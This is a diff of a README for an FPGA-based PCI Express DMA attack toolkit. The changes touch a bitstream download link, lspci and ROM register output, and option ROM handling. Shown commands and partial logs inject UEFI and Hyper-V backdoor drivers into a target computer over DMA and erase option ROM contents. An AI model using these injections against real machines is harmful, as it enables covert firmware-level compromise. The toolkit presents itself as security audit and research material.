@@ -110,7 +110,6 @@
 <p><code>python/payloads/DmaBackdoorHv</code> − UEFI DXE driver which implements Hyper-V backdoor and backdoor client.</p>
 </li>
 </ul>
-<p>Ready to use FPGA bitstream files <code>s6_pcie_microblaze.mcs</code> and  <code>s6_pcie_microblaze.bin</code> can be downloaded <a href="https://mega.nz/#!rccnTTTI!s8RSL8y1KyMjL0arGNUNxWio-lesgPPHueOLeaKKluY" rel="nofollow">here</a>.</p>
 <h2>
 <a id="user-content-sp605-board-configuration" class="anchor" href="#sp605-board-configuration" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>SP605 board configuration</h2>
 <p><a href="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/board.jpg" target="_blank" rel="nofollow"><img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/board.jpg" width="800" height="415" style="max-width:100%;"></a></p>
@@ -224,7 +223,6 @@ start_application(): TCP server is started at port 28472
     Status: Cap+ 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast &gt;TAbort- &lt;TAbort- &lt;MAbort- &gt;SERR- &lt;PERR- INTx-
     Interrupt: pin A routed to IRQ 11
     Region 0: Memory at f7d00000 (32-bit, non-prefetchable) [disabled] [size=1M]
-    [virtual] Expansion ROM at 90c00000 [disabled] [size=512K]
     Capabilities: [40] Power Management version 3
         Flags: PMEClk- DSI- D1+ D2+ AuxCurrent=0mA PME(D0+,D1+,D2+,D3hot+,D3cold-)
         Status: D0 NoSoftRst+ PME-Enable- DSel=0 DScale=0 PME-
@@ -271,7 +269,7 @@ start_application(): TCP server is started at port 28472
          CARDBUS_CIS = 0x0
  SUBSYSTEM_VENDOR_ID = 0x10ee
         SUBSYSTEM_ID = 0x7
-         ROM_ADDRESS = 0xfff80000
+         ROM_ADDRESS = 0x0
       INTERRUPT_LINE = 0xff
        INTERRUPT_PIN = 0x1
              MIN_GNT = 0x0
@@ -293,7 +291,7 @@ start_application(): TCP server is started at port 28472
 0024: 0x0000 0x0000
 0028: 0x0000 0x0000
 002c: 0x10ee 0x0007
-0030: 0x0000 0xfff8
+0030: 0x0000 0x0000
 0034: 0x0040 0x0000
 0038: 0x0000 0x0000
 003c: 0x01ff 0x0000
@@ -443,7 +441,7 @@ dev.mem_write_1(<span class="pl-c1"><span class="pl-k">0x</span>1000</span>, <sp
 <p>Run the following command:</p>
 </li>
 </ol>
-<pre><code>$ ./uefi_backdoor_simple.py payloads/DmaBackdoorSimple/DmaBackdoorSimple_X64.efi
+<pre><code>$ ./uefi_backdoor_simple.py --payload payloads/DmaBackdoorSimple/DmaBackdoorSimple_X64.efi
 </code></pre>
 <ol start="3">
 <li>Power on the target computer, in case of successful attack in couple of seconds you will see debug messages screen of injected UEFI driver.</li>
@@ -470,7 +468,7 @@ Hooking LocateProtocol(): 0xd67e2c18 -&gt; 0x0001031c
 [+] DONE
 </code></pre>
 <p>Python program <code>uefi_backdoor_hv.py</code> injects Hyper-V VM exit handler backdoor located in UEFI driver <code>payloads/DmaBackdoorHv</code>. Usage:</p>
-<pre><code>./uefi_backdoor_hv.py payloads/DmaBackdoorHv/DmaBackdoorHv_X64.efi
+<pre><code>./uefi_backdoor_hv.py --payload payloads/DmaBackdoorHv/DmaBackdoorHv_X64.efi
 [+] PCI-E link with target is up
 [+] TSEG is somewhere around 0x8b800000
 [+] PE image is at 0x88930000
@@ -646,8 +644,9 @@ EPT PDPTE 0x145f9000[0x0]: 0x14612007
 <p><a href="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/backdoor_vm_inject.png" target="_blank" rel="nofollow"><img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/backdoor_vm_inject.png" width="749" height="498" style="max-width:100%;"></a></p>
 <h2>
 <a id="user-content-option-rom-attacks" class="anchor" href="#option-rom-attacks" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Option ROM attacks</h2>
-<p>Provided FPGA design emulates PCI-E device with 512K option ROM stored in onboard linear flash memory of SP605. Although modern platforms <a href="https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/uefi-validation-option-rom-validation-guidance" rel="nofollow">mitigates</a> option ROM <a href="https://trmm.net/Thunderstrike" rel="nofollow">attacks</a>, this feature still could be useful for security audit or prototyping purposes.</p>
-<p>Erasing option ROM contents:</p>
+<p>Alternative bitstream version <code>s6_pcie_microblaze_orom.bin</code>/<code>s6_pcie_microblaze_orom.mcs</code> can emulate PCI-E option ROM stored in onboard linear flash memory of SP605. Although modern platforms <a href="https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/uefi-validation-option-rom-validation-guidance" rel="nofollow">mitigates</a> option ROM <a href="https://trmm.net/Thunderstrike" rel="nofollow">attacks</a>, this feature still could be useful for security audit or prototyping purposes.</p>
+<p>You can manage option ROM images using <code>pcie_rom_ctl.py</code> Python program.
+Erasing option ROM contents:</p>
 <pre><code>$ ./pcie_rom_ctl.py --erase
 [+] Opening PCI-E device...
 [+] Enabling resident mode...
